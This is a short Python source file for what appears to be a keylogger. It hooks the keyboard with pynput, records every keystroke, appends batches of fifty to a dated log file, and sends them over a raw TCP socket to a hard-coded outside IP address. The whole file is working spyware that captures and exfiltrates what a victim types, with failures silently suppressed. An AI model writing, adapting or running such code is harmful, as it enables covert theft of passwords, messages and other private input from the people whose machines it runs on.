from pynput.keyboard import Key, Listener
from datetime import date
import socket
import sys

HEADER = 64                                            #message length
PORT = 4567                                            #random unused port
#SERVER = socket.gethostbyname(socket.gethostname())    #server ip address
SERVER = "145.93.116.196"
ADDRESS = (SERVER, PORT)                               #socket address
FORMAT = "utf-8"                                       #encoding format
DISCONNECT_MSG = "!DSC"                                #disconnect message
MAX_KEYSTROKES = 50


connected = False
keystrokeCounter = 0
keystrokes = ""


client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    client.connect(ADDRESS)
    connected = True
except:
    pass

def sendMsg(message):
    try:
        client.send(message)
    except:
        connected = False

def sendToServer(keys):
    message = keys.encode(FORMAT)
    msg_length = len(message)
    send_length = str(msg_length).encode(FORMAT)
    send_length += b' '*(HEADER - len(send_length))
    sendMsg(send_length)
    sendMsg(message)


def printToFile(keys):
    try:        
        f = open(f"upd\log[{date.today()}].txt", "a")
        f.write(keys)
        f.close()
    except:
        sendToServer(keystrokes)
        sendMsg(DISCONNECT_MSG)
        sys.exit()
    
def reset():
    global keystrokeCounter
    global keystrokes
    keystrokeCounter = 0
    keystrokes = ""
    
def logKeys():
    global keystrokes
    global connected
    printToFile(keystrokes)
    if(connected):
        try:
            sendToServer(keystrokes)
        except:
            pass   
    reset()
    

def sanitize(key):
    if(len(key) > 3):
        return key[4:].upper()
    if(key[0] == '"'):
        return key[1]
    return key.replace("'", '')

def on_press(key):
    global keystrokes
    global keystrokeCounter
    keystrokeCounter += 1;
    keystrokes += sanitize(str(key)) + ","
    if(keystrokeCounter == MAX_KEYSTROKES):
        logKeys()
    
with Listener(on_press=on_press) as listener:
    listener.join()


